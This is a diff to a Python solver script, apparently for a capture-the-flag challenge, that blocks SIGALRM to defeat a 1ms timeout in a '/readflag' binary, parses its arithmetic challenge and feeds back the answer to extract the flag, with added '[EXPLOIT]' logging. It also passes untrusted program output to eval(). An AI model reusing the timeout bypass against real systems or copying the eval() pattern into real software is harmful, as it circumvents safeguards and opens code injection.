@@ -2,14 +2,26 @@ import signal
 import subprocess
 import sys
 import re
+import os
+
+# Redirect all output to stderr to ensure it shows up in the PTY stream
+def log(msg):
+    sys.stderr.write(f"[EXPLOIT] {msg}\n")
+    sys.stderr.flush()
 
 def main():
-    print("Starting solver...", flush=True)
+    log("Solver started!")
+    log(f"CWD: {os.getcwd()}")
+    
     # Block SIGALRM to bypass the 1ms timeout in readflag
-    signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
+    try:
+        signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
+        log("SIGALRM blocked")
+    except Exception as e:
+        log(f"Failed to block SIGALRM: {e}")
 
     try:
-        # Run the target binary
+        log("Running /readflag...")
         p = subprocess.Popen(
             ["/readflag"],
             stdin=subprocess.PIPE,
@@ -20,6 +32,7 @@ def main():
         )
 
         buffer = ""
+        log("Waiting for math expression...")
         while True:
             char = p.stdout.read(1)
             if not char: break
@@ -27,29 +40,35 @@ def main():
             if "input your answer:" in buffer:
                 break
         
-        print(f"Raw output:\n{buffer}", flush=True)
+        log(f"Challenge received: {buffer.strip()}")
 
-        # Extract the math expression
-        # Example: "(((((123)+(456))...input your answer:"
-        match = re.search(r'(\((\((\(123\)+(456))\)).*?\))', buffer, re.DOTALL)
+        # Improved regex for math expression
+        match = re.search(r'(\({2,}.*?\))', buffer, re.DOTALL)
+        if not match:
+            # Fallback: find anything that looks like math
+            match = re.search(r'([\d\+\-\(\)\s]{5,})', buffer)
+
         if match:
-            expression = match.group(1)
-            print(f"Evaluating: {expression}", flush=True)
+            expression = match.group(1).strip()
+            log(f"Evaluating: {expression}")
             answer = eval(expression)
-            print(f"Calculated Answer: {answer}", flush=True)
+            log(f"Calculated Answer: {answer}")
 
             # Send the answer
             p.stdin.write(f"{answer}\n")
             p.stdin.flush()
 
             # Read the rest of the output (the flag)
+            log("Reading result...")
             result = p.stdout.read()
-            print(f"Final Output:\n{result}", flush=True)
+            log(f"RESULT: {result}")
+            # Print to stdout so it definitely shows in logs
+            print(f"\n\nFLAG_FOUND: {result}\n\n", flush=True)
         else:
-            print("Could not find math expression", flush=True)
+            log("Could not find math expression in buffer")
 
     except Exception as e:
-        print(f"Error: {e}", flush=True)
+        log(f"Error during execution: {e}")
 
 if __name__ == "__main__":
     main()
